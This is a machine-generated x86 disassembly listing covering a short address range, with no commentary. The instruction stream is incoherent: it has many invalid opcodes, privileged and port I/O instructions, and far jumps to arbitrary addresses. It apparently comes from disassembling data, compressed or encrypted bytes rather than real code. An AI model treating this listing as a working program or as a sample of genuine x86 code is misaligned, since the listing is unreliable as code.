  418ffa:	fnstsw WORD PTR [ebp-0x7c75404f]
  419000:	(bad)  
  419001:	push   ecx
  419002:	repz std 
  419004:	adc    eax,0xe14885ef
  419009:	cmp    edx,esi
  41900b:	imul   esi,DWORD PTR [ebx],0xd80c3ce5
  419011:	pushf  
  419012:	or     DWORD PTR [edx+0x46],edx
  419015:	push   0x65
  419017:	jb     0x418fb0
  419019:	adc    eax,0xe8cb6189
  41901e:	mov    ecx,0x820bd3f3
  419023:	call   0xd48822cc
  419028:	call   0x339d:0x4220385f
  41902f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419030:	and    eax,esi
  419032:	nop
  419033:	je     0x41906a
  419035:	cdq    
  419036:	std    
  419037:	aam    0xc6
  419039:	xchg   esi,eax
  41903a:	adc    cl,BYTE PTR [ecx+0x63]
  41903d:	repnz and edi,ebp
  419040:	sbb    BYTE PTR [ebp+0xd],0xce
  419044:	jo     0x418fd5
  419046:	fwait
  419047:	jno    0x419074
  419049:	pusha  
  41904a:	xor    DWORD PTR [edx+0x1502dc1],0x8dffd776
  419054:	mov    bl,0x97
  419056:	bound  eax,QWORD PTR [esi+0x44]
  419059:	mov    edi,0x985052a1
  41905e:	fst    QWORD PTR [ecx-0x59]
  419061:	mov    ah,0xe5
  419063:	fimul  DWORD PTR [ebx-0x35]
  419066:	xchg   esp,eax
  419067:	and    BYTE PTR [edi+0x48dd64e9],bh
  41906d:	lock (bad) 
  419070:	test   BYTE PTR [edi],dl
  419072:	add    DWORD PTR [edx-0x69],esi
  419075:	and    edi,edx
  419077:	enter  0xdabb,0xdd
  41907b:	je     0x419038
  41907d:	sti    
  41907e:	sub    al,0xb8
  419080:	pop    ebx
  419081:	jecxz  0x41908f
  419083:	sub    bl,dl
  419085:	xchg   DWORD PTR [ecx-0x23],ebx
  419088:	jmp    0x13fb6a2a
  41908d:	jns    0x4190a5
  41908f:	leave  
  419090:	scas   eax,DWORD PTR es:[edi]
  419091:	ds mov esi,0xb3c230ef
  419097:	mov    esp,0x74bc790b
  41909c:	sub    al,0x92
  41909e:	cdq    
  41909f:	inc    ebp
  4190a0:	fwait
  4190a1:	mov    ebp,0x3b34ade7
  4190a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a7:	or     eax,0x9d9bf59d
  4190ac:	fwait
  4190ad:	ret    
  4190ae:	push   esp
  4190af:	mov    esi,DWORD PTR [edi-0x5868d1c1]
  4190b5:	ud1    ecx,DWORD PTR [edx]
  4190b8:	add    eax,DWORD PTR [esi-0x749605af]
  4190be:	loopne 0x419081
  4190c0:	jg     0x41905e
  4190c2:	rcr    DWORD PTR [edi+0x23b4ad82],1
  4190c8:	sub    eax,0x5c8ef2ca
  4190cd:	daa    
  4190ce:	inc    ebp
  4190cf:	mov    bl,BYTE PTR [eax]
  4190d1:	xchg   edi,eax
  4190d2:	pop    esi
  4190d3:	pusha  
  4190d4:	adc    dl,bh
  4190d6:	pop    esi
  4190d7:	jp     0x41912f
  4190d9:	xchg   esp,eax
  4190da:	inc    eax
  4190db:	int    0x9
  4190dd:	mov    WORD PTR [ebp+0x21f24eb7],ds
  4190e3:	jno    0x41910c
  4190e5:	xor    esi,DWORD PTR [ebp-0x53034bad]
  4190eb:	or     al,0xf0
  4190ed:	fisub  WORD PTR [ebp-0x1970a360]
  4190f3:	jbe    0x4190ec
  4190f5:	fmulp  st(1),st
  4190f7:	mov    ah,0x51
  4190f9:	xor    eax,0x55536a07
  4190fe:	loope  0x4190fd
  419100:	cmp    eax,0xad4fd9da
  419105:	cld    
  419106:	or     al,0xff
  419108:	jb     0x419181
  41910a:	add    ch,dh
  41910c:	mov    ?,edx
  41910e:	daa    
  41910f:	repnz xlat BYTE PTR ds:[ebx]
  419111:	jbe    0x41910c
  419113:	adc    eax,0x627b627
  419118:	mov    ebx,0x10cad7d5
  41911d:	xchg   ebp,eax
  41911e:	mov    BYTE PTR [edx-0x40bc2adb],dh
  419124:	mov    ds:0x9aa2fbf6,al
  419129:	sub    DWORD PTR [eax-0xee9eee3],ebx
  41912f:	cmp    eax,0xf6d3e91c
  419134:	in     eax,0x1
  419136:	add    bl,BYTE PTR [eax+0x5588bd8f]
  41913c:	ins    BYTE PTR es:[edi],dx
  41913d:	(bad)  
  41913e:	dec    eax
  41913f:	adc    dl,bl
  419141:	ss push eax
  419143:	inc    ecx
  419144:	popf   
  419145:	push   0xffffff85
  419147:	dec    BYTE PTR [ebx+ecx*2]
  41914a:	sbb    cl,BYTE PTR [ecx]
  41914c:	cmp    al,0xe1
  41914e:	int    0x78
  419150:	add    DWORD PTR [ebp+0x10],0xc1ba0e7e
  419157:	push   0x2274252b
  41915c:	sub    dh,bh
  41915e:	xchg   edx,eax
  41915f:	mov    dh,0x35
  419161:	jl     0x41912a
  419163:	(bad)  
  419164:	div    ecx
  419166:	fs xor ebp,ebx
  419169:	loopne 0x4191c1
  41916b:	jo     0x4191a9
  41916d:	and    DWORD PTR [edi+0x2f84a7c1],0x3a
  419174:	mov    ebp,DWORD PTR [edi-0x205ddcf3]
  41917a:	cmp    eax,0xc0427479
  41917f:	nop
  419180:	iret   
  419181:	inc    esp
  419182:	loop   0x4191e1
  419184:	std    
  419185:	push   edi
  419186:	cmp    eax,0x5ee7c2f7
  41918b:	mov    ch,0x9d
  41918d:	sbb    BYTE PTR [esi],bl
  41918f:	add    eax,DWORD PTR [edx-0x2c]
  419192:	ss pop esp
  419194:	mov    BYTE PTR [ecx],al
  419196:	pop    edx
  419197:	jb     0x41915d
  419199:	ror    ah,0x44
  41919c:	lock inc eax
  41919e:	(bad)  
  41919f:	adc    eax,DWORD PTR [edx]
  4191a1:	or     edi,DWORD PTR [edx-0x7474f65d]
  4191a7:	cdq    
  4191a8:	mov    esp,0xb79062cd
  4191ad:	sub    DWORD PTR [ecx-0x3ed780de],ebp
  4191b3:	push   eax
  4191b4:	aad    0xe0
  4191b6:	mov    eax,0x209577f2
  4191bb:	ins    DWORD PTR es:[edi],dx
  4191bc:	mov    ah,0x1d
  4191be:	mov    dh,BYTE PTR [edx]
  4191c0:	(bad)  
  4191c1:	std    
  4191c2:	sbb    al,0x88
  4191c4:	dec    esp
  4191c5:	sub    al,bl
  4191c7:	fisub  DWORD PTR [ebx+eiz*4-0x364a6455]
  4191ce:	or     ah,ah
  4191d0:	dec    esp
  4191d1:	xlat   BYTE PTR fs:[ebx]
  4191d3:	mov    ds:0xd1d6a8de,al
  4191d8:	push   0xffffffbf
  4191da:	xchg   esi,eax
  4191db:	mov    bl,0x12
  4191dd:	outs   dx,DWORD PTR ds:[esi]
  4191de:	push   edx
  4191df:	data16 jge 0x419222
  4191e2:	cmc    
  4191e3:	pop    es
  4191e4:	je     0x41919d
  4191e6:	js     0x4191e9
  4191e8:	adc    DWORD PTR [edx-0xdbd8e13],ebp
  4191ee:	aad    0x32
  4191f0:	mov    eax,ds:0x443e997
  4191f5:	retf   
  4191f6:	dec    ebx
  4191f7:	mov    ecx,0x4b70ad5b
  4191fc:	mov    ebx,0x86ce2844
  419201:	rcr    BYTE PTR fs:[edi+0x4d9634dd],0xab
  419209:	push   bp
  41920b:	popf   
  41920c:	pop    edi
  41920d:	ret    0xb349
  419210:	test   al,0xab
  419212:	push   eax
  419213:	cmp    BYTE PTR [edi-0x4d57b5bd],cl
  419219:	mov    ecx,0xa91f8a27
  41921e:	mov    ds:0x3580b202,al
  419223:	add    al,0x5a
  419225:	aam    0x94
  419227:	stc    
  419228:	push   ecx
  419229:	retf   0x21be
  41922c:	retf   0xa326
  41922f:	imul   edx,DWORD PTR [ecx],0xffffffc0
  419232:	sahf   
  419233:	out    0xfe,eax
  419235:	mov    esp,?
  419237:	dec    ebp
  419238:	cmp    DWORD PTR [esp+esi*4+0x3b800b23],esp
  41923f:	cwde   
  419240:	outs   dx,BYTE PTR ds:[esi]
  419241:	xchg   ebp,eax
  419242:	add    esp,0xffffffe5
  419245:	repnz sbb bl,BYTE PTR [eax-0x2f]
  419249:	daa    
  41924a:	xchg   ebp,eax
  41924b:	mov    eax,ds:0x169b7571
  419250:	fidivr WORD PTR [ecx]
  419252:	sbb    BYTE PTR [edi-0x21],al
  419255:	push   ds
  419256:	jp     0x419281
  419258:	imul   esi,DWORD PTR [esi],0x782755da
  41925e:	dec    eax
  41925f:	push   cs
  419260:	mov    ds:0xeedf6ee,al
  419265:	mov    BYTE PTR [eax+eax*4+0x89b8024],dl
  41926c:	xor    eax,0x6f9e1b06
  419271:	cmp    DWORD PTR [edi],esp
  419273:	or     ch,bh
  419275:	lods   eax,DWORD PTR ds:[esi]
  419276:	xor    eax,ecx
  419278:	stos   BYTE PTR es:[edi],al
  419279:	test   DWORD PTR [esi],edi
  41927b:	mov    eax,0x2744423d
  419280:	test   BYTE PTR [edx-0x506c1f2d],ah
  419286:	mov    ecx,0x8b01ba9c
  41928b:	xor    esi,eax
  41928d:	test   al,0xd4
  41928f:	pop    ecx
  419290:	fidiv  DWORD PTR ds:0xcfcc4563
  419296:	jecxz  0x419219
  419298:	dec    edx
  419299:	jg     0x41929e
  41929b:	sub    eax,0x6124252e
  4192a0:	mov    esp,0x64c37236
  4192a5:	dec    eax
  4192a6:	push   cs
  4192a7:	mov    bh,0xd6
  4192a9:	rol    DWORD PTR [edx+0x18],0x5f
  4192ad:	mov    eax,ds:0x4b3a5357
  4192b2:	mov    bh,0xc7
  4192b4:	jbe    0x41924a
  4192b6:	dec    edx
  4192b7:	imul   edi,DWORD PTR [ecx],0x70cf9165
  4192bd:	add    al,0x87
  4192bf:	jmp    0x41928a
  4192c1:	ja     0x41927f
  4192c3:	test   al,0xe0
  4192c5:	mov    ds:0x9281ed2e,eax
  4192ca:	mov    ds:0x2e2b3d36,al
  4192cf:	pop    es
  4192d0:	sbb    bh,BYTE PTR [ebp+0x37]
  4192d3:	in     eax,dx
  4192d4:	adc    al,0x67
  4192d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192d7:	fldcw  WORD PTR [edi-0x74]
  4192da:	call   0x9f425aed
  4192df:	mov    cl,0x85
  4192e1:	mov    dh,0x7f
  4192e3:	mov    fs,WORD PTR [esi-0x47d97518]
  4192e9:	sub    DWORD PTR [ebx-0x2ae67768],eax
  4192ef:	xor    eax,0x9c160d13
  4192f4:	jnp    0x41931d
  4192f6:	fwait
  4192f7:	aas    
  4192f8:	and    DWORD PTR [edx+0x2dee766c],eax
  4192fe:	cdq    
  4192ff:	(bad)  
  419300:	lds    eax,FWORD PTR [ebx-0x41]
  419303:	xchg   ebp,eax
  419304:	xor    BYTE PTR ds:0x7847ed52,bh
  41930a:	xor    al,0x78
  41930c:	scas   eax,DWORD PTR es:[edi]
  41930d:	es (bad) 
  41930f:	jno    0x4192c5
  419311:	scas   eax,DWORD PTR es:[edi]
  419312:	fbld   TBYTE PTR [ecx-0x42]
  419315:	lods   eax,DWORD PTR ds:[esi]
  419316:	js     0x4192c1
  419318:	jo     0x419369
  41931a:	mov    esi,0xb4bacd7a
  41931f:	mov    fs,WORD PTR [ebp+0x18bde89a]
  419325:	call   0x228db40b
  41932a:	lods   al,BYTE PTR ds:[esi]
  41932b:	sub    eax,0x2871c7ed
  419330:	icebp  
  419331:	(bad)  
  419333:	mov    dh,dl
  419335:	pop    edi
  419336:	nop
  419337:	fcmovu st,st(0)
  419339:	test   eax,0xecb79724
  41933e:	cmovp  eax,edi
  419341:	mov    eax,0x946f81e4
  419346:	adc    al,0x82
  419348:	xchg   DWORD PTR [eax+eax*2],ebp
  41934b:	popa   
  41934c:	inc    ebp
  41934d:	(bad)  
  41934e:	pop    ebx
  41934f:	paddsb mm7,QWORD PTR [ebp-0x558ca919]
  419356:	mov    ss,WORD PTR [esi-0x400ed7d9]
  41935c:	ret    
  41935d:	cmp    al,0x9
  41935f:	and    DWORD PTR [edi],ebp
  419361:	jg     0x4193bb
  419363:	xchg   ecx,eax
  419364:	adc    DWORD PTR [ebp+0x45],ecx
  419367:	add    DWORD PTR cs:[edi-0xa91f6f0],esi
  41936e:	pop    edx
  41936f:	mov    al,ds:0x10d0b308
  419374:	fistp  QWORD PTR [eax-0x461bcbbb]
  41937a:	sbb    al,0x89
  41937c:	stos   DWORD PTR es:[edi],eax
  41937d:	loop   0x419319
  41937f:	nop
  419380:	jb     0x419401
  419382:	xor    al,0x36
  419384:	test   al,0xfb
  419386:	stos   DWORD PTR es:[edi],eax
  419387:	or     ch,BYTE PTR [edi+0x6cb89f38]
  41938d:	inc    edx
  41938e:	xor    eax,0x25b6d7ba
  419393:	mov    esp,0x7bbcc922
  419398:	pop    es
  419399:	test   eax,0x17d13a29
  41939e:	fist   WORD PTR [eax+0x9a037ae]
  4193a4:	cmp    DWORD PTR [eax-0x63],esp
  4193a7:	jmp    0xe9fb:0xce99cff2
  4193ae:	inc    edx
  4193af:	out    dx,al
  4193b0:	pop    es
  4193b1:	out    dx,al
  4193b2:	inc    edx
  4193b3:	xchg   ebp,eax
  4193b4:	sub    al,0xb9
  4193b6:	(bad)  
  4193b7:	cs ds icebp 
  4193ba:	adc    DWORD PTR [ebx+0x31],ecx
  4193bd:	(bad)  
  4193be:	jp     0x4193f7
  4193c0:	shl    BYTE PTR [edx+0x5a390e1a],0x9d
  4193c7:	lods   al,BYTE PTR ds:[esi]
  4193c8:	inc    esi
  4193c9:	and    bh,BYTE PTR [ebp-0x34]
  4193cc:	xor    dh,al
  4193ce:	aaa    
  4193cf:	test   BYTE PTR [ebx-0x2ba415eb],cl
  4193d5:	imul   ebp,DWORD PTR [ebx],0xffffffcb
  4193d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d9:	test   eax,0xb89b2a6b
  4193de:	xchg   edx,eax
  4193df:	ds dec ecx
  4193e1:	retf   
  4193e2:	lea    edi,[eax+0x5c]
  4193e5:	leave  
  4193e6:	pop    edi
  4193e7:	mov    eax,ds:0x71be0de0
  4193ec:	out    dx,al
  4193ed:	add    BYTE PTR [ebp-0x1986edd0],bl
  4193f3:	imul   DWORD PTR [edx-0x74]
  4193f6:	xchg   esi,eax
  4193f7:	adc    eax,0x80ecbe2f
  4193fc:	cdq    
  4193fd:	std    
  4193fe:	mov    dh,0x73
  419400:	pop    ds
  419401:	aad    0x1f
  419403:	jmp    0x4193d6
  419405:	push   esp
  419406:	bnd call 0xe0cbd4a
  41940c:	jb     0x419413
  41940e:	mov    esi,0x5a49f7f5
  419413:	xchg   edi,eax
  419414:	push   esp
  419415:	(bad)  
  419416:	inc    eax
  419417:	nop
  419418:	xchg   esp,eax
  419419:	pop    eax
  41941a:	lock outs dx,BYTE PTR ds:[esi]
  41941c:	or     cl,bl
  41941e:	in     eax,dx
  41941f:	pop    ebx
  419420:	mov    eax,0x52fcd62b
  419425:	test   eax,0x8a36b41a
  41942a:	(bad)
  41942e:	clc    
  41942f:	leave  
  419430:	jmp    0x419433
  419432:	pop    ecx
  419433:	lods   al,BYTE PTR ds:[esi]
  419434:	das    
  419435:	sbb    DWORD PTR [ecx-0x39],ebx
  419438:	(bad)  [ebx]
  41943a:	lock and BYTE PTR [eax+0x55],ah
  41943e:	fwait
  41943f:	stos   DWORD PTR es:[edi],eax
  419440:	fcom   DWORD PTR [edx+0x4652cfc4]
  419446:	inc    edi
  419447:	shr    eax,cl
  419449:	outs   dx,BYTE PTR ds:[esi]
  41944a:	push   cs
  41944b:	xchg   esi,eax
  41944c:	add    DWORD PTR [eax],0x31
  41944f:	pop    edx
  419450:	js     0x4193fa
  419452:	cmp    eax,0x23cb86b2
  419457:	xor    BYTE PTR [ecx+ecx*8+0x65],0x7
  41945c:	and    BYTE PTR [edx-0x37],0x13
  419460:	xor    DWORD PTR [esp+eiz*2+0x27],esp
  419464:	pop    edx
  419465:	pop    ss
  419466:	addr16 sbb al,0x3a
  419469:	jecxz  0x4194d4
  41946b:	aas    
  41946c:	stos   BYTE PTR es:[edi],al
  41946d:	add    DWORD PTR [ebx+0x7],edi
  419470:	and    edx,DWORD PTR [ebx-0x43]
  419473:	lahf   
  419474:	out    dx,al
  419475:	jmp    0x4cf1a1ca
  41947a:	(bad)  
  41947b:	dec    ebx
  41947c:	call   0x3aff:0x75bd0a82
  419483:	dec    ecx
  419484:	out    dx,eax
  419485:	add    DWORD PTR ds:0x4c950fa3,ebx
  41948b:	pop    esi
  41948c:	inc    BYTE PTR [edi]
  41948e:	and    ebx,eax
  419490:	div    DWORD PTR ds:0x5d59c51f
  419496:	xor    edi,ebp
  419498:	inc    ebx
  419499:	stc    
  41949a:	mov    DWORD PTR [ecx-0x45],esp
  41949d:	sub    edi,DWORD PTR [ecx]
  41949f:	sbb    al,0x41
  4194a1:	sub    al,0xe5
  4194a3:	loope  0x41949b
  4194a5:	jle    0x419464
  4194a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a8:	jno    0x4194d3
  4194aa:	or     eax,0xa79a689
  4194af:	sbb    al,0x67
  4194b1:	mov    ebx,esi
  4194b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b4:	stc    
  4194b5:	jno    0x41946c
  4194b7:	test   al,0xef
  4194b9:	out    0xc9,eax
  4194bb:	ss jnp 0x419440
  4194be:	sbb    BYTE PTR [esi+esi*2],ah
  4194c1:	adc    eax,0xfaa55227
  4194c6:	hlt    
  4194c7:	mov    al,ds:0x6a09b8ae
  4194cc:	mov    edx,DWORD PTR [edx]
  4194ce:	sub    edx,DWORD PTR [ebx]
  4194d0:	(bad)  
  4194d1:	pop    eax
  4194d2:	cdq    
  4194d3:	mov    eax,0x30938c52
  4194d8:	add    al,0xfe
  4194da:	xlat   BYTE PTR ds:[ebx]
  4194db:	dec    ebp
  4194dc:	js     0x419473
  4194de:	fs sbb al,0xe9
  4194e1:	fwait
  4194e2:	jbe    0x4194d8
  4194e4:	sbb    BYTE PTR [edi],al
  4194e6:	lods   al,BYTE PTR ds:[esi]
  4194e7:	push   0xa042afdf
  4194ec:	and    BYTE PTR [edx],ah
  4194ee:	push   edx
  4194ef:	pop    ss
  4194f0:	sub    eax,0xc24dedd6
  4194f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f7:	inc    ecx
  4194f8:	retf   
  4194f9:	repnz (bad) 
  4194fb:	nop
  4194fc:	push   esp
  4194fd:	xor    ebp,ebp
  4194ff:	icebp  
  419500:	(bad)  
  419501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419502:	or     al,0x93
  419504:	dec    ecx
  419505:	daa    
  419506:	mov    ecx,DWORD PTR [esi+0x16]
  419509:	js     0x419507
  41950b:	fmul   DWORD PTR [ecx]
  41950d:	add    bl,BYTE PTR [esi+0x7bcf298f]
  419513:	pop    eax
  419514:	mov    BYTE PTR [edx+0x56],0x8
  419518:	push   0x292bc1b2
  41951d:	outs   dx,BYTE PTR ds:[esi]
  41951e:	push   ebx
  41951f:	call   0xf71c5e85
  419524:	je     0x419551
  419526:	in     eax,0x9a
  419528:	loop   0x4194b1
  41952a:	mov    eax,0x3239df39
  41952f:	retf   
  419530:	or     ebp,esi
  419532:	sbb    al,0x51
  419534:	mov    esi,0x4fdf7057
  419539:	ror    BYTE PTR [edx+0x402b5ca3],1
  41953f:	adc    al,0x66
  419541:	or     al,0x4c
  419543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419544:	ss cmp al,0xc5
  419547:	shl    dh,cl
  419549:	mov    eax,ds:0x773d7577
  41954e:	cmp    ecx,edx
  419550:	pop    ss
  419551:	mov    eax,0x1f0a80d8
  419556:	jl     0x4194f6
  419558:	lahf   
  419559:	adc    al,0xc0
  41955b:	(bad)  
  41955c:	in     eax,dx
  41955d:	ins    DWORD PTR es:[edi],dx
  41955e:	repz and bh,ch
  419561:	or     bl,BYTE PTR [ecx+ecx*2]
  419564:	in     al,dx
  419565:	sbb    BYTE PTR [edx+0x21ec3623],ah
  41956b:	add    al,0x7a
  41956d:	pop    esp
  41956e:	loopne 0x4194fe
  419570:	inc    ebx
  419571:	pop    ds
  419572:	(bad)  
  419574:	test   al,0x52
  419576:	add    esi,edx
  419578:	repnz and bp,WORD PTR [esi-0x29]
  41957d:	push   ecx
  41957e:	and    eax,0x420e97bf
  419583:	(bad)
  419586:	ja     0x4195ae
  419588:	lods   eax,DWORD PTR ds:[esi]
  419589:	outs   dx,DWORD PTR ds:[esi]
  41958a:	cmp    eax,0xb5d68186
  41958f:	jmp    0x184d:0x6f966b66
  419596:	clc    
  419597:	sar    BYTE PTR [ebp-0xff1f56e],0xcc
  41959e:	sub    al,0xa
  4195a0:	fild   QWORD PTR [eax]
  4195a2:	call   0x7ddf:0xe2bdd079
  4195a9:	pop    ecx
  4195aa:	test   ch,bh
  4195ac:	mov    al,0x61
  4195ae:	leave  
  4195af:	or     eax,DWORD PTR [esi+ebx*1+0x6b]
  4195b3:	clts   
  4195b5:	loop   0x419566
  4195b7:	jg     0x419598
  4195b9:	popf   
  4195ba:	add    ah,dh
  4195bc:	jp     0x419541
  4195be:	xor    dl,BYTE PTR [esi-0x58b99d7c]
  4195c4:	shl    BYTE PTR [ebp-0xe],0x1
  4195c8:	xor    al,BYTE PTR [ecx+edx*4-0x79daddaf]
  4195cf:	rcr    DWORD PTR [ebp+0x34],cl
  4195d2:	jbe    0x4195f6
  4195d4:	into   
  4195d5:	or     al,BYTE PTR [esi]
  4195d7:	xor    al,0x16
  4195d9:	imul   esi,DWORD PTR [ecx-0x56f22e4b],0x17
  4195e0:	push   ds
  4195e1:	sbb    dh,ch
  4195e3:	mul    BYTE PTR [ebp-0x695056a2]
  4195e9:	imul   ebp,DWORD PTR [edi],0x7b2a12e9
  4195ef:	adc    eax,0x7d994105
  4195f4:	dec    ebx
  4195f5:	mov    al,ds:0xccb80a20
  4195fa:	out    dx,al
  4195fb:	dec    esp
  4195fc:	xor    al,0x3f
  4195fe:	aaa    
  4195ff:	dec    edi
  419600:	(bad)  
  419601:	adc    DWORD PTR [edx],eax
  419603:	mov    ebx,DWORD PTR [eax]
  419605:	loop   0x4195d8
  419607:	xor    BYTE PTR es:[edi+0x6a99735b],bh
  41960e:	aam    0x31
  419610:	leave  
  419611:	and    eax,0x29d24aec
  419616:	pop    ecx
  419617:	stos   DWORD PTR es:[edi],eax
  419618:	xchg   esi,eax
  419619:	arpl   WORD PTR [esi+0x1a],dx
  41961c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41961d:	jmp    0xbfc8:0xb0bc76ca
  419624:	out    dx,eax
  419625:	adc    bl,bh
  419627:	pop    esi
  419628:	mov    esp,0x4a1aae5e
  41962d:	dec    ecx
  41962e:	adc    BYTE PTR [esi-0x44],al
  419631:	into   
  419632:	sub    BYTE PTR [esi-0x5a],dh
  419635:	sahf   
  419636:	mov    al,0xde
  419638:	sub    al,0xe6
  41963a:	adc    al,0x95
  41963c:	in     al,0x78
  41963e:	and    DWORD PTR [edi],edi
  419640:	pop    esi
  419641:	add    ch,BYTE PTR [edx-0xb8b4e5d]
  419647:	add    ch,cl
  419649:	jae    0x4195d5
  41964b:	icebp  
  41964c:	jge    0x4195f3
  41964e:	fsub   DWORD PTR [ecx-0x31]
  419651:	dec    edi
  419652:	push   ebp
  419653:	sbb    edi,DWORD PTR [esi-0x1c4a4dd3]
  419659:	sti    
  41965a:	ins    DWORD PTR es:[edi],dx
  41965b:	aaa    
  41965c:	pop    es
  41965d:	fdivr  st(6),st
  41965f:	adc    dl,BYTE PTR [esp+esi*4-0x7e3dcc35]
  419666:	push   cs
  419667:	out    0x87,eax
  419669:	imul   esp,DWORD PTR [ecx+0x76ada728],0x16
  419670:	scas   eax,DWORD PTR es:[edi]
  419671:	(bad)  
  419672:	shr    al,1
  419674:	mov    al,0xc1
  419676:	ins    BYTE PTR es:[edi],dx
  419677:	ret    
  419678:	rcr    BYTE PTR [ebp-0x5],0x81
  41967c:	and    ah,BYTE PTR [ebx+0x5c]
  41967f:	loopne 0x419603
  419681:	icebp  
  419682:	mov    ss,ebp
  419684:	test   eax,0x4b96f364
  419689:	cdq    
  41968a:	(bad)  
  41968b:	(bad)  
  41968c:	cmp    ebp,DWORD PTR [edi]
  41968e:	daa    
  41968f:	sub    BYTE PTR [ecx],0x78
  419692:	adc    DWORD PTR ds:0x2e546c53,esi
  419698:	mov    WORD PTR [ebx+0xb],es
  41969b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41969c:	pop    ss
  41969d:	sbb    eax,0xcb7d6522
  4196a2:	sti    
  4196a3:	cs jg  0x419659
  4196a6:	add    DWORD PTR [edx+esi*8-0x5b63961a],ebp
  4196ad:	and    ebp,DWORD PTR [esi+0x48]
  4196b0:	fwait
  4196b1:	xchg   ecx,edi
  4196b3:	cwde   
  4196b4:	(bad)  
  4196b5:	cli    
  4196b6:	(bad)  
  4196b7:	sbb    bh,BYTE PTR [ebp+0x12]
  4196ba:	leave  
  4196bb:	and    edi,DWORD PTR [ecx-0x70bfa7f5]
  4196c1:	cdq    
  4196c2:	mov    eax,edx
  4196c4:	vpsubw xmm0,xmm7,XMMWORD PTR [edx]
  4196c8:	jmp    0x7bcb:0x9f937e4d
  4196cf:	data16 fisttp DWORD PTR [edx]
  4196d2:	sbb    BYTE PTR [edi+eax*1],dl
  4196d5:	adc    eax,0x3f71f487
  4196da:	cmp    dl,cl
  4196dc:	dec    ebx
  4196dd:	aam    0x50
  4196df:	clc    
  4196e0:	jae    0x4196d1
  4196e2:	js     0x4196c5
  4196e4:	out    0x4,eax
  4196e6:	fwait
  4196e7:	or     cl,BYTE PTR [edx]
  4196e9:	push   eax
  4196ea:	icebp  
  4196eb:	sub    DWORD PTR [edi+0x6ba41824],eax
  4196f1:	add    cl,dh
  4196f3:	inc    edx
  4196f4:	mov    cl,0xae
  4196f6:	lea    ebx,[esp+ebx*2+0xb0cda6c]
  4196fd:	mov    esi,0x32cbc3fa
  419702:	jecxz  0x4196e1
  419704:	sbb    bh,BYTE PTR ds:0x9dbea814
  41970a:	adc    eax,0xd8af3ceb
  41970f:	push   cs
  419710:	adc    DWORD PTR [esi-0x12],esi
  419713:	outs   dx,BYTE PTR ds:[esi]
  419714:	pop    ebp
  419715:	push   0xcf498dd1
  41971a:	leave  
  41971b:	mov    edx,0x6da465a
  419720:	fs cmp ch,ah
  419723:	jge    0x4196c9
  419725:	mov    esp,0x81cd9d10
  41972a:	ss in  eax,dx
  41972c:	sub    esp,DWORD PTR [eax+0x2e]
  41972f:	mov    dl,0x74
  419731:	int3   
  419732:	std    
  419733:	dec    edx
  419734:	sbb    eax,0x279ed547
  419739:	pop    edx
  41973a:	pop    es
  41973b:	xchg   DWORD PTR [edi+0x32],ebp
  41973e:	and    dl,BYTE PTR ds:0x93c9ed87
  419744:	push   edx
  419745:	inc    esi
  419746:	mov    ebx,0x7b76ed06
  41974b:	mov    bh,BYTE PTR [ecx]
  41974d:	add    eax,0xfc6e7abf
  419752:	ins    BYTE PTR es:[edi],dx
  419753:	mov    esp,0x14b375b7
  419758:	and    al,0xbb
  41975a:	icebp  
  41975b:	push   esp
  41975c:	(bad)  
  41975d:	repnz lahf 
  41975f:	mov    dl,0x45
  419761:	sub    BYTE PTR [ebp-0x6b0a710a],0x80
  419768:	int    0x43
  41976a:	or     edx,ebp
  41976c:	add    eax,0x6b0c2223
  419771:	pop    ds
  419772:	rol    edx,0xf9
  419775:	enter  0xb4d5,0x4f
  419779:	sahf   
  41977a:	mov    bl,0x94
  41977c:	lea    eax,[ebp-0x6c]
  41977f:	cdq    
  419780:	sub    esp,DWORD PTR gs:[ebp-0x2d]
  419784:	push   cs
  419785:	aam    0xcb
  419787:	xchg   edi,eax
  419788:	imul   ebp,edi,0x516e7984
  41978e:	std    
  41978f:	push   ebp
  419790:	sbb    eax,0x76617389
  419795:	aas    
  419796:	call   FWORD PTR [ecx]
  419798:	sahf   
  419799:	push   ebx
  41979a:	push   ebx
  41979b:	mov    bh,0x74
  41979d:	icebp  
  41979e:	rcl    DWORD PTR [esi-0x2b],cl
  4197a1:	shl    dl,1
  4197a3:	addr16 dec ecx
  4197a5:	pop    ss
  4197a6:	mov    DWORD PTR [edx-0x21],edx
  4197a9:	and    ch,BYTE PTR [eax+eax*2]
  4197ac:	xor    bl,BYTE PTR [edi]
  4197ae:	enter  0xba4f,0x1
  4197b2:	hlt    
  4197b3:	mov    WORD PTR [edi],?
  4197b5:	mov    ch,dh
  4197b7:	pop    ss
  4197b8:	sub    ebp,edi
  4197ba:	call   0x3bb2c133
  4197bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197c0:	cwde   
  4197c1:	cmp    al,0xc4
  4197c3:	dec    edi
  4197c4:	inc    ebx
  4197c5:	sbb    al,bh
  4197c7:	xchg   ebp,eax
  4197c8:	xor    edx,ecx
  4197ca:	jns    0x419776
  4197cc:	aad    0xf5
  4197ce:	dec    ebp
  4197cf:	sub    eax,0x1c62699a
  4197d4:	jns    0x4197b5
  4197d6:	cmp    al,0x6f
  4197d8:	sub    DWORD PTR [ebp+0x47b1ba7e],0x3e
  4197df:	imul   edx,DWORD PTR [esi],0xf
  4197e2:	lea    ebp,[esi+0x36]
  4197e5:	loopne 0x4197e4
  4197e7:	sbb    al,0x46
  4197e9:	adc    dh,BYTE PTR [ebx-0x7d]
  4197ec:	push   esi
  4197ed:	sub    esp,DWORD PTR [esi-0x1e]
  4197f0:	jecxz  0x4197d8
  4197f2:	push   esp
  4197f3:	mov    BYTE PTR [eax-0x61e29f4e],al
  4197f9:	mov    eax,ds:0x299c14ec
  4197fe:	inc    edi
  4197ff:	mov    cs,edx
  419801:	xchg   edi,eax
  419802:	aaa    
